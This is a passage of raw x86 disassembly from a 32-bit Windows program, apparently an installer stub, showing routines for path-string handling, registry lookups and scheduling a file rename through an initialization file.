  4064b8:	8d 85 68 f4 ff ff    	lea    -0xb98(%ebp),%eax
  4064be:	50                   	push   %eax
  4064bf:	56                   	push   %esi
  4064c0:	c7 85 68 f4 ff ff 28 	movl   $0x428,-0xb98(%ebp)
  4064c7:	04 00 00 
  4064ca:	ff 55 e8             	call   *-0x18(%ebp)
  4064cd:	eb 2d                	jmp    0x4064fc
  4064cf:	8d 85 c4 fc ff ff    	lea    -0x33c(%ebp),%eax
  4064d5:	50                   	push   %eax
  4064d6:	8d 85 88 f4 ff ff    	lea    -0xb78(%ebp),%eax
  4064dc:	50                   	push   %eax
  4064dd:	ff 15 1c 81 40 00    	call   *0x40811c
  4064e3:	85 c0                	test   %eax,%eax
  4064e5:	74 67                	je     0x40654e
  4064e7:	8d 85 68 f4 ff ff    	lea    -0xb98(%ebp),%eax
  4064ed:	50                   	push   %eax
  4064ee:	56                   	push   %esi
  4064ef:	c7 85 68 f4 ff ff 28 	movl   $0x428,-0xb98(%ebp)
  4064f6:	04 00 00 
  4064f9:	ff 55 e0             	call   *-0x20(%ebp)
  4064fc:	85 c0                	test   %eax,%eax
  4064fe:	75 cf                	jne    0x4064cf
  406500:	56                   	push   %esi
  406501:	ff 15 bc 80 40 00    	call   *0x4080bc
  406507:	8d 85 98 fa ff ff    	lea    -0x568(%ebp),%eax
  40650d:	50                   	push   %eax
  40650e:	ff 75 fc             	push   -0x4(%ebp)
  406511:	89 9d 98 fa ff ff    	mov    %ebx,-0x568(%ebp)
  406517:	ff 55 f4             	call   *-0xc(%ebp)
  40651a:	85 c0                	test   %eax,%eax
  40651c:	75 88                	jne    0x4064a6
  40651e:	ff 75 fc             	push   -0x4(%ebp)
  406521:	ff 15 bc 80 40 00    	call   *0x4080bc
  406527:	ff 75 f0             	push   -0x10(%ebp)
  40652a:	ff 15 3c 81 40 00    	call   *0x40813c
  406530:	33 c0                	xor    %eax,%eax
  406532:	eb 31                	jmp    0x406565
  406534:	be 5d 02 00 00       	mov    $0x25d,%esi
  406539:	ff 75 fc             	push   -0x4(%ebp)
  40653c:	ff 15 bc 80 40 00    	call   *0x4080bc
  406542:	57                   	push   %edi
  406543:	ff 15 3c 81 40 00    	call   *0x40813c
  406549:	e9 df fd ff ff       	jmp    0x40632d
  40654e:	56                   	push   %esi
  40654f:	ff 15 bc 80 40 00    	call   *0x4080bc
  406555:	33 f6                	xor    %esi,%esi
  406557:	46                   	inc    %esi
  406558:	eb df                	jmp    0x406539
  40655a:	57                   	push   %edi
  40655b:	e9 3b ff ff ff       	jmp    0x40649b
  406560:	b8 78 02 00 00       	mov    $0x278,%eax
  406565:	5f                   	pop    %edi
  406566:	5e                   	pop    %esi
  406567:	5b                   	pop    %ebx
  406568:	c9                   	leave
  406569:	c2 04 00             	ret    $0x4
  40656c:	56                   	push   %esi
  40656d:	8b 74 24 08          	mov    0x8(%esp),%esi
  406571:	56                   	push   %esi
  406572:	ff 15 c8 80 40 00    	call   *0x4080c8
  406578:	8d 04 46             	lea    (%esi,%eax,2),%eax
  40657b:	50                   	push   %eax
  40657c:	56                   	push   %esi
  40657d:	ff 15 10 82 40 00    	call   *0x408210
  406583:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  406587:	74 0c                	je     0x406595
  406589:	68 d0 82 40 00       	push   $0x4082d0
  40658e:	56                   	push   %esi
  40658f:	ff 15 f0 80 40 00    	call   *0x4080f0
  406595:	8b c6                	mov    %esi,%eax
  406597:	5e                   	pop    %esi
  406598:	c2 04 00             	ret    $0x4
  40659b:	56                   	push   %esi
  40659c:	8b 74 24 08          	mov    0x8(%esp),%esi
  4065a0:	56                   	push   %esi
  4065a1:	ff 15 c8 80 40 00    	call   *0x4080c8
  4065a7:	8d 04 46             	lea    (%esi,%eax,2),%eax
  4065aa:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  4065ae:	74 0c                	je     0x4065bc
  4065b0:	50                   	push   %eax
  4065b1:	56                   	push   %esi
  4065b2:	ff 15 10 82 40 00    	call   *0x408210
  4065b8:	3b c6                	cmp    %esi,%eax
  4065ba:	77 ee                	ja     0x4065aa
  4065bc:	33 c9                	xor    %ecx,%ecx
  4065be:	66 89 08             	mov    %cx,(%eax)
  4065c1:	83 c0 02             	add    $0x2,%eax
  4065c4:	5e                   	pop    %esi
  4065c5:	c2 04 00             	ret    $0x4
  4065c8:	56                   	push   %esi
  4065c9:	57                   	push   %edi
  4065ca:	ff 74 24 0c          	push   0xc(%esp)
  4065ce:	be e0 a2 45 00       	mov    $0x45a2e0,%esi
  4065d3:	56                   	push   %esi
  4065d4:	e8 f6 f9 ff ff       	call   0x405fcf
  4065d9:	56                   	push   %esi
  4065da:	e8 e1 f6 ff ff       	call   0x405cc0
  4065df:	8b f8                	mov    %eax,%edi
  4065e1:	85 ff                	test   %edi,%edi
  4065e3:	75 04                	jne    0x4065e9
  4065e5:	33 c0                	xor    %eax,%eax
  4065e7:	eb 5e                	jmp    0x406647
  4065e9:	57                   	push   %edi
  4065ea:	e8 7e fa ff ff       	call   0x40606d
  4065ef:	f6 05 28 46 47 00 80 	testb  $0x80,0x474628
  4065f6:	74 0e                	je     0x406606
  4065f8:	0f b7 07             	movzwl (%edi),%eax
  4065fb:	66 85 c0             	test   %ax,%ax
  4065fe:	74 e5                	je     0x4065e5
  406600:	66 83 f8 5c          	cmp    $0x5c,%ax
  406604:	74 df                	je     0x4065e5
  406606:	2b fe                	sub    %esi,%edi
  406608:	53                   	push   %ebx
  406609:	8b 1d c8 80 40 00    	mov    0x4080c8,%ebx
  40660f:	d1 ff                	sar    $1,%edi
  406611:	eb 15                	jmp    0x406628
  406613:	56                   	push   %esi
  406614:	e8 05 fb ff ff       	call   0x40611e
  406619:	85 c0                	test   %eax,%eax
  40661b:	74 05                	je     0x406622
  40661d:	f6 00 10             	testb  $0x10,(%eax)
  406620:	74 2a                	je     0x40664c
  406622:	56                   	push   %esi
  406623:	e8 73 ff ff ff       	call   0x40659b
  406628:	56                   	push   %esi
  406629:	ff d3                	call   *%ebx
  40662b:	3b c7                	cmp    %edi,%eax
  40662d:	7f e4                	jg     0x406613
  40662f:	56                   	push   %esi
  406630:	e8 37 ff ff ff       	call   0x40656c
  406635:	56                   	push   %esi
  406636:	ff 15 7c 80 40 00    	call   *0x40807c
  40663c:	33 c9                	xor    %ecx,%ecx
  40663e:	83 f8 ff             	cmp    $0xffffffff,%eax
  406641:	0f 95 c1             	setne  %cl
  406644:	8b c1                	mov    %ecx,%eax
  406646:	5b                   	pop    %ebx
  406647:	5f                   	pop    %edi
  406648:	5e                   	pop    %esi
  406649:	c2 04 00             	ret    $0x4
  40664c:	33 c0                	xor    %eax,%eax
  40664e:	eb f6                	jmp    0x406646
  406650:	55                   	push   %ebp
  406651:	8b ec                	mov    %esp,%ebp
  406653:	8b 45 0c             	mov    0xc(%ebp),%eax
  406656:	83 ec 18             	sub    $0x18,%esp
  406659:	85 c0                	test   %eax,%eax
  40665b:	7d 11                	jge    0x40666e
  40665d:	8b 0d a8 c5 46 00    	mov    0x46c5a8,%ecx
  406663:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  40666a:	2b c8                	sub    %eax,%ecx
  40666c:	8b 01                	mov    (%ecx),%eax
  40666e:	8b 0d f8 45 47 00    	mov    0x4745f8,%ecx
  406674:	8d 0c 41             	lea    (%ecx,%eax,2),%ecx
  406677:	b8 40 45 46 00       	mov    $0x464540,%eax
  40667c:	57                   	push   %edi
  40667d:	8b f8                	mov    %eax,%edi
  40667f:	39 45 08             	cmp    %eax,0x8(%ebp)
  406682:	72 16                	jb     0x40669a
  406684:	8b 55 08             	mov    0x8(%ebp),%edx
  406687:	2b d0                	sub    %eax,%edx
  406689:	d1 fa                	sar    $1,%edx
  40668b:	81 fa 08 40 00 00    	cmp    $0x4008,%edx
  406691:	73 07                	jae    0x40669a
  406693:	8b 7d 08             	mov    0x8(%ebp),%edi
  406696:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  40669a:	0f b7 11             	movzwl (%ecx),%edx
  40669d:	66 85 d2             	test   %dx,%dx
  4066a0:	0f 84 23 02 00 00    	je     0x4068c9
  4066a6:	53                   	push   %ebx
  4066a7:	56                   	push   %esi
  4066a8:	8b f7                	mov    %edi,%esi
  4066aa:	2b f0                	sub    %eax,%esi
  4066ac:	83 e6 fe             	and    $0xfffffffe,%esi
  4066af:	81 fe 08 40 00 00    	cmp    $0x4008,%esi
  4066b5:	0f 8d 0c 02 00 00    	jge    0x4068c7
  4066bb:	0f b7 d2             	movzwl %dx,%edx
  4066be:	41                   	inc    %ecx
  4066bf:	be 00 e0 00 00       	mov    $0xe000,%esi
  4066c4:	41                   	inc    %ecx
  4066c5:	89 55 0c             	mov    %edx,0xc(%ebp)
  4066c8:	85 d6                	test   %edx,%esi
  4066ca:	0f 84 d5 01 00 00    	je     0x4068a5
  4066d0:	8b de                	mov    %esi,%ebx
  4066d2:	66 3b d3             	cmp    %bx,%dx
  4066d5:	0f 86 ca 01 00 00    	jbe    0x4068a5
  4066db:	0f b7 01             	movzwl (%ecx),%eax
  4066de:	8b d8                	mov    %eax,%ebx
  4066e0:	8b f0                	mov    %eax,%esi
  4066e2:	c1 e8 08             	shr    $0x8,%eax
  4066e5:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  4066eb:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4066ee:	0d 00 80 00 00       	or     $0x8000,%eax
  4066f3:	8b d3                	mov    %ebx,%edx
  4066f5:	81 ca 00 80 00 00    	or     $0x8000,%edx
  4066fb:	81 e6 ff 7f 00 00    	and    $0x7fff,%esi
  406701:	41                   	inc    %ecx
  406702:	89 45 f0             	mov    %eax,-0x10(%ebp)
  406705:	41                   	inc    %ecx
  406706:	b8 02 e0 00 00       	mov    $0xe002,%eax
  40670b:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  40670e:	89 55 e8             	mov    %edx,-0x18(%ebp)
  406711:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  406714:	66 39 45 0c          	cmp    %ax,0xc(%ebp)
  406718:	0f 85 1a 01 00 00    	jne    0x406838
  40671e:	6a 02                	push   $0x2
  406720:	5e                   	pop    %esi
  406721:	ff 15 0c 81 40 00    	call   *0x40810c
  406727:	85 c0                	test   %eax,%eax
  406729:	79 1c                	jns    0x406747
  40672b:	b9 04 5a 00 00       	mov    $0x5a04,%ecx
  406730:	66 3b c1             	cmp    %cx,%ax
  406733:	74 12                	je     0x406747
  406735:	83 7d f4 23          	cmpl   $0x23,-0xc(%ebp)
  406739:	74 0c                	je     0x406747
  40673b:	83 7d f4 2e          	cmpl   $0x2e,-0xc(%ebp)
  40673f:	74 06                	je     0x406747
  406741:	83 65 0c 00          	andl   $0x0,0xc(%ebp)
  406745:	eb 07                	jmp    0x40674e
  406747:	c7 45 0c 01 00 00 00 	movl   $0x1,0xc(%ebp)
  40674e:	83 3d 84 46 47 00 00 	cmpl   $0x0,0x474684
  406755:	74 03                	je     0x40675a
  406757:	6a 04                	push   $0x4
  406759:	5e                   	pop    %esi
  40675a:	84 db                	test   %bl,%bl
  40675c:	79 3a                	jns    0x406798
  40675e:	8b c3                	mov    %ebx,%eax
  406760:	83 e0 40             	and    $0x40,%eax
  406763:	50                   	push   %eax
  406764:	a1 f8 45 47 00       	mov    0x4745f8,%eax
  406769:	57                   	push   %edi
  40676a:	83 e3 3f             	and    $0x3f,%ebx
  40676d:	8d 04 58             	lea    (%eax,%ebx,2),%eax
  406770:	50                   	push   %eax
  406771:	68 a0 88 40 00       	push   $0x4088a0
  406776:	68 02 00 00 80       	push   $0x80000002
  40677b:	e8 18 f7 ff ff       	call   0x405e98
  406780:	66 83 3f 00          	cmpw   $0x0,(%edi)
  406784:	0f 85 9a 00 00 00    	jne    0x406824
  40678a:	ff 75 f4             	push   -0xc(%ebp)
  40678d:	57                   	push   %edi
  40678e:	e8 bd fe ff ff       	call   0x406650
  406793:	e9 86 00 00 00       	jmp    0x40681e
  406798:	83 fb 25             	cmp    $0x25,%ebx
  40679b:	75 0e                	jne    0x4067ab
  40679d:	68 04 20 00 00       	push   $0x2004
  4067a2:	57                   	push   %edi
  4067a3:	ff 15 08 81 40 00    	call   *0x408108
  4067a9:	eb 73                	jmp    0x40681e
  4067ab:	83 fb 24             	cmp    $0x24,%ebx
  4067ae:	75 6a                	jne    0x40681a
  4067b0:	68 04 20 00 00       	push   $0x2004
  4067b5:	57                   	push   %edi
  4067b6:	ff 15 b4 80 40 00    	call   *0x4080b4
  4067bc:	33 f6                	xor    %esi,%esi
  4067be:	eb 5a                	jmp    0x40681a
  4067c0:	a1 d0 45 47 00       	mov    0x4745d0,%eax
  4067c5:	33 c9                	xor    %ecx,%ecx
  4067c7:	4e                   	dec    %esi
  4067c8:	3b c1                	cmp    %ecx,%eax
  4067ca:	74 18                	je     0x4067e4
  4067cc:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  4067cf:	74 13                	je     0x4067e4
  4067d1:	57                   	push   %edi
  4067d2:	51                   	push   %ecx
  4067d3:	51                   	push   %ecx
  4067d4:	ff 74 b5 e8          	push   -0x18(%ebp,%esi,4)
  4067d8:	ff 35 d4 45 47 00    	push   0x4745d4
  4067de:	ff d0                	call   *%eax
  4067e0:	85 c0                	test   %eax,%eax
  4067e2:	74 3a                	je     0x40681e
  4067e4:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4067e7:	50                   	push   %eax
  4067e8:	ff 74 b5 e8          	push   -0x18(%ebp,%esi,4)
  4067ec:	ff 35 d4 45 47 00    	push   0x4745d4
  4067f2:	ff 15 90 81 40 00    	call   *0x408190
  4067f8:	85 c0                	test   %eax,%eax
  4067fa:	75 19                	jne    0x406815
  4067fc:	57                   	push   %edi
  4067fd:	ff 75 fc             	push   -0x4(%ebp)
  406800:	ff 15 80 81 40 00    	call   *0x408180
  406806:	ff 75 fc             	push   -0x4(%ebp)
  406809:	8b d8                	mov    %eax,%ebx
  40680b:	ff 15 b0 82 40 00    	call   *0x4082b0
  406811:	85 db                	test   %ebx,%ebx
  406813:	75 09                	jne    0x40681e
  406815:	33 c0                	xor    %eax,%eax
  406817:	66 89 07             	mov    %ax,(%edi)
  40681a:	85 f6                	test   %esi,%esi
  40681c:	75 a2                	jne    0x4067c0
  40681e:	66 83 3f 00          	cmpw   $0x0,(%edi)
  406822:	74 4e                	je     0x406872
  406824:	83 7d f4 1a          	cmpl   $0x1a,-0xc(%ebp)
  406828:	75 48                	jne    0x406872
  40682a:	68 f8 88 40 00       	push   $0x4088f8
  40682f:	57                   	push   %edi
  406830:	ff 15 f0 80 40 00    	call   *0x4080f0
  406836:	eb 3a                	jmp    0x406872
  406838:	b8 01 e0 00 00       	mov    $0xe001,%eax
  40683d:	66 39 45 0c          	cmp    %ax,0xc(%ebp)
  406841:	75 37                	jne    0x40687a
  406843:	83 fe 1d             	cmp    $0x1d,%esi
  406846:	75 0e                	jne    0x406856
  406848:	ff 35 d4 45 47 00    	push   0x4745d4
  40684e:	57                   	push   %edi
  40684f:	e8 c2 f6 ff ff       	call   0x405f16
  406854:	eb 14                	jmp    0x40686a
  406856:	8b c6                	mov    %esi,%eax
  406858:	69 c0 08 40 00 00    	imul   $0x4008,%eax,%eax
  40685e:	05 00 50 47 00       	add    $0x475000,%eax
  406863:	50                   	push   %eax
  406864:	57                   	push   %edi
  406865:	e8 65 f7 ff ff       	call   0x405fcf
  40686a:	83 c6 eb             	add    $0xffffffeb,%esi
  40686d:	83 fe 07             	cmp    $0x7,%esi
  406870:	73 1f                	jae    0x406891
  406872:	57                   	push   %edi
  406873:	e8 f5 f7 ff ff       	call   0x40606d
  406878:	eb 17                	jmp    0x406891
  40687a:	b8 03 e0 00 00       	mov    $0xe003,%eax
  40687f:	66 39 45 0c          	cmp    %ax,0xc(%ebp)
  406883:	75 0c                	jne    0x406891
  406885:	83 c8 ff             	or     $0xffffffff,%eax
  406888:	2b c6                	sub    %esi,%eax
  40688a:	50                   	push   %eax
  40688b:	57                   	push   %edi
  40688c:	e8 bf fd ff ff       	call   0x406650
  406891:	57                   	push   %edi
  406892:	ff 15 c8 80 40 00    	call   *0x4080c8
  406898:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40689b:	8d 3c 47             	lea    (%edi,%eax,2),%edi
  40689e:	b8 40 45 46 00       	mov    $0x464540,%eax
  4068a3:	eb 16                	jmp    0x4068bb
  4068a5:	66 3b d6             	cmp    %si,%dx
  4068a8:	75 0c                	jne    0x4068b6
  4068aa:	66 8b 11             	mov    (%ecx),%dx
  4068ad:	66 89 17             	mov    %dx,(%edi)
  4068b0:	47                   	inc    %edi
  4068b1:	47                   	inc    %edi
  4068b2:	41                   	inc    %ecx
  4068b3:	41                   	inc    %ecx
  4068b4:	eb 05                	jmp    0x4068bb
  4068b6:	66 89 17             	mov    %dx,(%edi)
  4068b9:	47                   	inc    %edi
  4068ba:	47                   	inc    %edi
  4068bb:	0f b7 11             	movzwl (%ecx),%edx
  4068be:	66 85 d2             	test   %dx,%dx
  4068c1:	0f 85 e1 fd ff ff    	jne    0x4066a8
  4068c7:	5e                   	pop    %esi
  4068c8:	5b                   	pop    %ebx
  4068c9:	33 c9                	xor    %ecx,%ecx
  4068cb:	66 89 0f             	mov    %cx,(%edi)
  4068ce:	5f                   	pop    %edi
  4068cf:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  4068d2:	74 09                	je     0x4068dd
  4068d4:	50                   	push   %eax
  4068d5:	ff 75 08             	push   0x8(%ebp)
  4068d8:	e8 f2 f6 ff ff       	call   0x405fcf
  4068dd:	c9                   	leave
  4068de:	c2 08 00             	ret    $0x8
  4068e1:	51                   	push   %ecx
  4068e2:	53                   	push   %ebx
  4068e3:	55                   	push   %ebp
  4068e4:	56                   	push   %esi
  4068e5:	57                   	push   %edi
  4068e6:	68 34 8a 40 00       	push   $0x408a34
  4068eb:	bb e8 e2 45 00       	mov    $0x45e2e8,%ebx
  4068f0:	53                   	push   %ebx
  4068f1:	ff 15 00 81 40 00    	call   *0x408100
  4068f7:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  4068fb:	33 ed                	xor    %ebp,%ebp
  4068fd:	be 00 04 00 00       	mov    $0x400,%esi
  406902:	3b fd                	cmp    %ebp,%edi
  406904:	74 29                	je     0x40692f
  406906:	6a 01                	push   $0x1
  406908:	55                   	push   %ebp
  406909:	57                   	push   %edi
  40690a:	e8 06 f5 ff ff       	call   0x405e15
  40690f:	50                   	push   %eax
  406910:	ff 15 bc 80 40 00    	call   *0x4080bc
  406916:	56                   	push   %esi
  406917:	53                   	push   %ebx
  406918:	57                   	push   %edi
  406919:	ff 15 6c 80 40 00    	call   *0x40806c
  40691f:	3b c5                	cmp    %ebp,%eax
  406921:	0f 84 7f 01 00 00    	je     0x406aa6
  406927:	3b c6                	cmp    %esi,%eax
  406929:	0f 8f 77 01 00 00    	jg     0x406aa6
  40692f:	56                   	push   %esi
  406930:	bf 40 39 46 00       	mov    $0x463940,%edi
  406935:	57                   	push   %edi
  406936:	ff 74 24 20          	push   0x20(%esp)
  40693a:	ff 15 6c 80 40 00    	call   *0x40806c
  406940:	3b c5                	cmp    %ebp,%eax
  406942:	0f 84 5e 01 00 00    	je     0x406aa6
  406948:	3b c6                	cmp    %esi,%eax
  40694a:	0f 8f 56 01 00 00    	jg     0x406aa6
  406950:	55                   	push   %ebp
  406951:	55                   	push   %ebp
  406952:	56                   	push   %esi
  406953:	68 e8 ea 45 00       	push   $0x45eae8
  406958:	6a ff                	push   $0xffffffff
  40695a:	53                   	push   %ebx
  40695b:	8b 1d 48 81 40 00    	mov    0x408148,%ebx
  406961:	55                   	push   %ebp
  406962:	55                   	push   %ebp
  406963:	ff d3                	call   *%ebx
  406965:	85 c0                	test   %eax,%eax
  406967:	0f 84 39 01 00 00    	je     0x406aa6
  40696d:	55                   	push   %ebp
  40696e:	55                   	push   %ebp
  40696f:	56                   	push   %esi
  406970:	be 38 f1 45 00       	mov    $0x45f138,%esi
  406975:	56                   	push   %esi
  406976:	6a ff                	push   $0xffffffff
  406978:	57                   	push   %edi
  406979:	55                   	push   %ebp
  40697a:	55                   	push   %ebp
  40697b:	ff d3                	call   *%ebx
  40697d:	85 c0                	test   %eax,%eax
  40697f:	0f 84 21 01 00 00    	je     0x406aa6
  406985:	56                   	push   %esi
  406986:	68 e8 ea 45 00       	push   $0x45eae8
  40698b:	68 2c 8a 40 00       	push   $0x408a2c
  406990:	68 38 f5 45 00       	push   $0x45f538
  406995:	ff 15 1c 82 40 00    	call   *0x40821c
  40699b:	83 c4 10             	add    $0x10,%esp
  40699e:	8b d8                	mov    %eax,%ebx
  4069a0:	a1 dc 45 47 00       	mov    0x4745dc,%eax
  4069a5:	ff b0 28 01 00 00    	push   0x128(%eax)
  4069ab:	57                   	push   %edi
  4069ac:	e8 9f fc ff ff       	call   0x406650
  4069b1:	6a 04                	push   $0x4
  4069b3:	68 00 00 00 c0       	push   $0xc0000000
  4069b8:	57                   	push   %edi
  4069b9:	e8 57 f4 ff ff       	call   0x405e15
  4069be:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4069c2:	83 f8 ff             	cmp    $0xffffffff,%eax
  4069c5:	0f 84 db 00 00 00    	je     0x406aa6
  4069cb:	55                   	push   %ebp
  4069cc:	50                   	push   %eax
  4069cd:	ff 15 98 80 40 00    	call   *0x408098
  4069d3:	8b f8                	mov    %eax,%edi
  4069d5:	8d 44 1f 0a          	lea    0xa(%edi,%ebx,1),%eax
  4069d9:	50                   	push   %eax
  4069da:	6a 40                	push   $0x40
  4069dc:	ff 15 24 81 40 00    	call   *0x408124
  4069e2:	8b f0                	mov    %eax,%esi
  4069e4:	3b f5                	cmp    %ebp,%esi
  4069e6:	0f 84 b0 00 00 00    	je     0x406a9c
  4069ec:	55                   	push   %ebp
  4069ed:	8d 44 24 14          	lea    0x14(%esp),%eax
  4069f1:	50                   	push   %eax
  4069f2:	57                   	push   %edi
  4069f3:	56                   	push   %esi
  4069f4:	ff 74 24 2c          	push   0x2c(%esp)
  4069f8:	ff 15 58 81 40 00    	call   *0x408158
  4069fe:	85 c0                	test   %eax,%eax
  406a00:	0f 84 96 00 00 00    	je     0x406a9c
  406a06:	3b 7c 24 10          	cmp    0x10(%esp),%edi
  406a0a:	0f 85 8c 00 00 00    	jne    0x406a9c
  406a10:	68 88 88 40 00       	push   $0x408888
  406a15:	56                   	push   %esi
  406a16:	e8 02 f3 ff ff       	call   0x405d1d
  406a1b:	3b c5                	cmp    %ebp,%eax
  406a1d:	75 14                	jne    0x406a33
  406a1f:	68 88 88 40 00       	push   $0x408888
  406a24:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  406a27:	50                   	push   %eax
  406a28:	ff 15 10 81 40 00    	call   *0x408110
  406a2e:	83 c7 0a             	add    $0xa,%edi
  406a31:	eb 31                	jmp    0x406a64
  406a33:	68 28 8a 40 00       	push   $0x408a28
  406a38:	83 c0 0a             	add    $0xa,%eax
  406a3b:	50                   	push   %eax
  406a3c:	e8 dc f2 ff ff       	call   0x405d1d
  406a41:	8b e8                	mov    %eax,%ebp
  406a43:	85 ed                	test   %ebp,%ebp
  406a45:	74 1b                	je     0x406a62
  406a47:	8d 0c 3e             	lea    (%esi,%edi,1),%ecx
  406a4a:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  406a4d:	eb 06                	jmp    0x406a55
  406a4f:	8a 11                	mov    (%ecx),%dl
  406a51:	88 10                	mov    %dl,(%eax)
  406a53:	48                   	dec    %eax
  406a54:	49                   	dec    %ecx
  406a55:	3b cd                	cmp    %ebp,%ecx
  406a57:	77 f6                	ja     0x406a4f
  406a59:	2b ee                	sub    %esi,%ebp
  406a5b:	45                   	inc    %ebp
  406a5c:	8b c5                	mov    %ebp,%eax
  406a5e:	33 ed                	xor    %ebp,%ebp
  406a60:	eb 04                	jmp    0x406a66
  406a62:	33 ed                	xor    %ebp,%ebp
  406a64:	8b c7                	mov    %edi,%eax
  406a66:	53                   	push   %ebx
  406a67:	68 38 f5 45 00       	push   $0x45f538
  406a6c:	03 c6                	add    %esi,%eax
  406a6e:	50                   	push   %eax
  406a6f:	e8 5d f3 ff ff       	call   0x405dd1
  406a74:	55                   	push   %ebp
  406a75:	55                   	push   %ebp
  406a76:	55                   	push   %ebp
  406a77:	ff 74 24 28          	push   0x28(%esp)
  406a7b:	ff 15 60 81 40 00    	call   *0x408160
  406a81:	55                   	push   %ebp
  406a82:	8d 44 24 14          	lea    0x14(%esp),%eax
  406a86:	50                   	push   %eax
  406a87:	03 fb                	add    %ebx,%edi
  406a89:	57                   	push   %edi
  406a8a:	56                   	push   %esi
  406a8b:	ff 74 24 2c          	push   0x2c(%esp)
  406a8f:	ff 15 54 81 40 00    	call   *0x408154
  406a95:	56                   	push   %esi
  406a96:	ff 15 30 81 40 00    	call   *0x408130
  406a9c:	ff 74 24 1c          	push   0x1c(%esp)
  406aa0:	ff 15 bc 80 40 00    	call   *0x4080bc
  406aa6:	5f                   	pop    %edi
  406aa7:	5e                   	pop    %esi
  406aa8:	5d                   	pop    %ebp
  406aa9:	5b                   	pop    %ebx
  406aaa:	59                   	pop    %ecx
  406aab:	c3                   	ret
  406aac:	6a 01                	push   $0x1
  406aae:	e8 92 f6 ff ff       	call   0x406145
  406ab3:	85 c0                	test   %eax,%eax
  406ab5:	74 10                	je     0x406ac7
  406ab7:	6a 05                	push   $0x5
  406ab9:	ff 74 24 0c          	push   0xc(%esp)
  406abd:	ff 74 24 0c          	push   0xc(%esp)
  406ac1:	ff d0                	call   *%eax
  406ac3:	85 c0                	test   %eax,%eax
  406ac5:	75 0f                	jne    0x406ad6
  406ac7:	ff 74 24 08          	push   0x8(%esp)
  406acb:	ff 74 24 08          	push   0x8(%esp)
  406acf:	e8 0d fe ff ff       	call   0x4068e1
  406ad4:	59                   	pop    %ecx
  406ad5:	59                   	pop    %ecx
  406ad6:	ff 05 90 46 47 00    	incl   0x474690
  406adc:	c2 08 00             	ret    $0x8
  406adf:	55                   	push   %ebp
  406ae0:	8b ec                	mov    %esp,%ebp
  406ae2:	81 ec 5c 02 00 00    	sub    $0x25c,%esp
  406ae8:	53                   	push   %ebx
  406ae9:	8b 5d 08             	mov    0x8(%ebp),%ebx
  406aec:	53                   	push   %ebx
  406aed:	e8 d6 fa ff ff       	call   0x4065c8
  406af2:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406af5:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406af8:	f6 c1 08             	test   $0x8,%cl
  406afb:	74 17                	je     0x406b14
  406afd:	53                   	push   %ebx
  406afe:	ff 15 70 81 40 00    	call   *0x408170
  406b04:	f7 d8                	neg    %eax
  406b06:	1b c0                	sbb    %eax,%eax
  406b08:	40                   	inc    %eax
  406b09:	01 05 88 46 47 00    	add    %eax,0x474688
  406b0f:	e9 a6 01 00 00       	jmp    0x406cba
  406b14:	89 4d 08             	mov    %ecx,0x8(%ebp)
  406b17:	83 65 08 01          	andl   $0x1,0x8(%ebp)
  406b1b:	56                   	push   %esi
  406b1c:	74 11                	je     0x406b2f
  406b1e:	85 c0                	test   %eax,%eax
  406b20:	0f 84 3f 01 00 00    	je     0x406c65
  406b26:	f6 c1 02             	test   $0x2,%cl
  406b29:	0f 84 36 01 00 00    	je     0x406c65
  406b2f:	57                   	push   %edi
  406b30:	53                   	push   %ebx
  406b31:	be 38 f9 45 00       	mov    $0x45f938,%esi
  406b36:	56                   	push   %esi
  406b37:	e8 93 f4 ff ff       	call   0x405fcf
  406b3c:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  406b40:	8b 3d f0 80 40 00    	mov    0x4080f0,%edi
  406b46:	74 0a                	je     0x406b52
  406b48:	68 3c 8a 40 00       	push   $0x408a3c
  406b4d:	56                   	push   %esi
  406b4e:	ff d7                	call   *%edi
  406b50:	eb 06                	jmp    0x406b58
  406b52:	53                   	push   %ebx
  406b53:	e8 43 fa ff ff       	call   0x40659b
  406b58:	66 83 3b 00          	cmpw   $0x0,(%ebx)
  406b5c:	75 0a                	jne    0x406b68
  406b5e:	66 83 3d 38 f9 45 00 	cmpw   $0x5c,0x45f938
  406b65:	5c 
  406b66:	75 08                	jne    0x406b70
  406b68:	68 d0 82 40 00       	push   $0x4082d0
  406b6d:	53                   	push   %ebx
  406b6e:	ff d7                	call   *%edi
  406b70:	53                   	push   %ebx
  406b71:	ff 15 c8 80 40 00    	call   *0x4080c8
  406b77:	8d 04 43             	lea    (%ebx,%eax,2),%eax
  406b7a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406b7d:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  406b83:	50                   	push   %eax
  406b84:	56                   	push   %esi
  406b85:	ff 15 6c 81 40 00    	call   *0x40816c
  406b8b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406b8e:	83 f8 ff             	cmp    $0xffffffff,%eax
  406b91:	0f 84 bd 00 00 00    	je     0x406c54
  406b97:	8d b5 d0 fd ff ff    	lea    -0x230(%ebp),%esi
  406b9d:	6a 3f                	push   $0x3f
  406b9f:	8b c6                	mov    %esi,%eax
  406ba1:	50                   	push   %eax
  406ba2:	e8 c5 f0 ff ff       	call   0x405c6c
  406ba7:	33 ff                	xor    %edi,%edi
  406ba9:	66 39 38             	cmp    %di,(%eax)
  406bac:	74 09                	je     0x406bb7
  406bae:	66 39 7d d8          	cmp    %di,-0x28(%ebp)
  406bb2:	74 03                	je     0x406bb7
  406bb4:	8d 75 d8             	lea    -0x28(%ebp),%esi
  406bb7:	66 83 3e 2e          	cmpw   $0x2e,(%esi)
  406bbb:	75 15                	jne    0x406bd2
